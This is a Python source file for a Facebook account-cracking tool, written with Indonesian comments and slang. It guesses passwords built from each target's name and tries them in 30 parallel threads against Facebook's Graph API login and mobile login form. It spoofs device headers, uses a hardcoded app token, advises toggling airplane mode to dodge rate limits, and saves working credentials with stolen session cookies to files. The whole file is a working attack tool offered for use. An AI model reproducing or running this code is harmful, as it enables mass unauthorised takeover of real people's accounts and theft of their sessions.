import random, sys, requests, re, time, datetime
from concurrent.futures import ThreadPoolExecutor as Modol
from bs4 import BeautifulSoup as par
from datetime import datetime
from time import time as mek
from .login_co import Login
from .asu import Logo

H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
N = '\x1b[0m'    # WARNA MATI
M = '\x1b[1;91m' # MERAH
# --- BULAN --------
ct = datetime.now().month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if ct < 0 or ct > 12:
        exit()
    nTemp = ct - 1
except ValueError:
    exit()
current = datetime.now()
ha = current.day
op = bulan[nTemp]
ta = current.year

class Metode_login:

    def __init__(self, id, nm, xy, xz):
        self.pw, self.ya = [], []
        self.nm, self.xy, self.xz = nm, xy, xz
        self.id, self.ok, self.cp, self.lo = id, [], [], 0

    def anjng(self):
        Logo().kontl(self.nm, self.xy, self.xz)
        print(f"""   OK results saved : results/OK/OK-{ha}-{op}-{ta}.txt
   CP results saved : results/CP/CP-{ha}-{op}-{ta}.txt
  +------------------------------------------------------+
   PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
  +------------------------------------------------------+\n""")

    def add_pas(self):
        print(f"\n   [=] total ids: {str(len(self.id))}")
        print("""
[01]. Additional passwords
[02]. Automatic passwords
        """)
        pil =  input("Choise: ")
        if pil in [" ", ""]:
            print(f"\n{M}Don't be empty");time.sleep(2);self.add_pas()
        elif pil in ["01", "1"]:
            self.gabung()
            self.metode()
        elif pil in ["02", "2"]:
            self.metode()
        else:print(f"\n{M}choose the right one");time.sleep(2);self.add_pas()

    def metode(self):
        print(f"""
        [ SELECT METHOD ]
[01]. method 1 ({H}fast{N})
[02]. method 2 ({M}slow{N})
        """)
        pil =  input("Choise: ")
        if pil in [" ", ""]:
            print(f"\n{M}Don't be empty");time.sleep(2);self.add_pas()
        elif pil in ["01", "1"]:
            self.Api_cok()
        elif pil in ["02", "2"]:
            self.Reg_cok()
        else:print(f"\n{M}choose the right one");time.sleep(2);self.add_pas()

    def gabung(self):
        self.ya.append("ya")
        print('Password must be at least 6 characters long, use "," (comma) for the following passwords')
        pasw = input("[+] password: ").split(",")
        for i in pasw:
            self.pw.append(i)

    def Reg_cok(self):
        self.anjng()
        with Modol(max_workers=30) as bool:
            for user in self.id:
                uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                depan = nama.split(" ")
                try:
                    if len(nama) <=5:
                        if len(depan) <=1 or len(depan) <=2:pass
                        else:
                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                    else:
                        pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                    if "ya" in self.ya:
                        for kontol in self.pw:
                            pwx.append(kontol)
                    bool.submit(self.Ngocok, uid, pwx)
                except:pass
        exit("\n\ncracking done!")

    def Api_cok(self):
        self.anjng()
        with Modol(max_workers=30) as bool:
            for user in self.id:
                uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                depan = nama.split(" ")
                try:
                    if len(nama) <=5:
                        if len(depan) <=1 or len(depan) <=2:pass
                        else:
                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                    else:
                        pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                    if "ya" in self.ya:
                        for kontol in self.pw:
                            pwx.append(kontol)
                    bool.submit(self.cok_ajg, uid, pwx)
                except:pass
        exit("\n\ncracking done!")

    def ua_ap(self):
        rr = random.randint
        rc = random.choice
        HP1 = 'HM 1S Build/KTU84P'
        HP2 = 'HM 1S'
        HP3 = 'HM'
        card = 'XL'
        return (f'Dalvik/2.1.0 (Linux; U; Android {str(rr(10,12))}; vivo 2019 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,329))}.0.0.{str(rr(1,8))}.{str(rr(90,106))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,500000000))};FBCR/Indosat Ooredoo;FBMF/vivo;FBBD/vivo;FBDV/vivo 2019;FBSV/{str(rr(6,10))};FBCA/arm64-v8a:null;FBDM/'+'{density=2.0,width=720,height=1412};]')

    def cok_ajg(self, username, pasw):
        sys.stdout.write(f"\r[Crack] {str(self.lo)}/{len(self.id)} - found-:{H}{len(self.ok)}{N} cp-:{K}{len(self.cp)}{N}");sys.stdout.flush()
        for password in pasw:
            try:
                ses=requests.Session()
                uas = self.ua_ap()
                head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)), 'x-fb-sim-hni': repr(random.randint(2e4, 4e4)), 'x-fb-net-hni': repr(random.randint(2e4, 4e4)),'x-fb-connection-quality': 'EXCELLENT','user-agent': uas,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': username, 'locale': 'ja_JP', 'password': password, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
                xnxx = ses.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False).json()
                if "session_key" in xnxx:
                    coki = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
                    print(f"\r{H}++ {username} | {password} ----> OK{N}")
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ok.append(kntl)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "www.facebook.com" in xnxx["error"]["message"]:
                    print(f"\r{M}++ {username} | {password} ----> CP{N}")
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
            except requests.exceptions.ConnectionError:sys.stdout.write(f"\r[{M}Spam{N}] {str(self.lo)}/{len(self.id)} - found-:{H}{len(self.ok)}{N} cp-:{K}{len(self.cp)}{N}");sys.stdout.flush();time.sleep(3)

        self.lo+=1

    def Ngocok(self, username, pasw):
        sys.stdout.write(f"\r[Crack] {str(self.lo)}/{len(self.id)} - found-:{H}{len(self.ok)}{N} cp-:{K}{len(self.cp)}{N}");sys.stdout.flush()
        for password in pasw:
            try:
                ses=requests.Session()
                uas=self.ua_ap()
                ses.headers.update({"Host": "m.facebook.com", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "referer": "https://m.facebook.com/oauth/error/?error_code=PLATFORM__LOGIN_DISABLED_FROM_WEBVIEW&display=touch", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
                link = ses.get("https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1")
                data = {
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                    "try_number": "0",
                    "unrecognized_tries": "0",
                    "email": username,
                    "prefill_contact_point": f"{username} {password}",
                    "prefill_source": "browser_dropdown",
                    "prefill_type": "password",
                    "first_prefill_source": "browser_dropdown",
                    "first_prefill_type": "contact_point",
                    "had_cp_prefilled": True,
                    "had_password_prefilled": True,
                    "is_smart_lock": False,
                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                    "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{password}",
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
                }
                head = {"Host": "m.facebook.com", "content-length": "1727", "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1), "user-agent": uas, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://m.facebook.com", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                xnxx = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=data, headers=head, allow_redirects=True)
                if "c_user" in ses.cookies.get_dict():
                    coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    print(f"\r{H}++ {username} | {password} ----> OK{N}")
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ok.append(kntl)
                    Login().akses({"cookie":coki})
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    print(f"\r{M}++ {username} | {password} ----> CP{N}")
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
            except requests.exceptions.ConnectionError:sys.stdout.write(f"\r[{M}Spam{N}] {str(self.lo)}/{len(self.id)} - found-:{H}{len(self.ok)}{N} cp-:{K}{len(self.cp)}{N}");sys.stdout.flush();time.sleep(3)

        self.lo+=1